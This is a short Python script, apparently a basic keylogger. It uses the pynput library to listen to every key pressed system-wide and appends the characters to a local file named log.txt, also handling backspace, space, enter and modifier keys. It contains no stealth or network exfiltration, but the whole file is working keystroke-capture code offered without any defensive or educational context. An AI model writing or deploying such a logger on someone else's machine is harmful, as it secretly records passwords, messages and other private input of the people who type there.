from pynput.keyboard import Key, Listener


def write_to_file(key):
    if key == Key.space:
        key = ' '
    elif key == Key.enter:
        key = '\n'
    elif key == Key.backspace:
        with open("log.txt", 'r') as f:
            content = f.read()
        with open("log.txt", 'w') as f:
            f.write(content[:-1])  # Remove the last character
        return
    elif key == Key.ctrl_l or key == Key.ctrl_r:
        key = ''
    elif key == Key.shift:
        key = ''
    else:
        try:
            key = key.char
        except AttributeError:
            pass

    with open("log.txt", 'a') as f:
        f.write(str(key))


with Listener(on_press=write_to_file) as l:
    l.join()
